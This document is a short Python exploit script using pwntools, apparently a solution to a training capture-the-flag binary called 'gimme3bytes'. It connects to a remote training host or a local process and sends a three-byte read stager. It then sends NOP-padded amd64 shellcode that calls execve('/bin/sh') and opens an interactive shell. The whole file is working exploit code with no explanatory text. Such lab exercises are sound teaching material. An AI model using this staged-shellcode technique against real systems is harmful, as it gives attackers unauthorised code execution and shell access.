#!/usr/bin/env python3

import sys
from pwn import *
from pwn import p32

if "--remote" in sys.argv:
    p = remote("bin.training.jinblack.it", 2004)
else:
    p = process("./gimme3bytes")

if "--debug" in sys.argv:
    context.terminal = ["terminator", "-e"]
    gdb.attach(p, """
    b *0x4011ec
    c
    """)

shellcode_read = asm("""
pop rdx
syscall
""", arch='amd64')

p.recvuntil(b">")
p.send(shellcode_read)

shellcode = asm("""
mov rdi, 0x0068732f6e69622f
push rdi    
mov rdi, rsp          

mov rax, 0x3b
mov rsi, 0
mov rdx, 0
syscall
""", arch='amd64')

total_len = len(shellcode_read) + len(shellcode)
payload = shellcode.rjust(total_len, b"\x90")

p.send(payload)
time.sleep(0.1)

p.interactive()
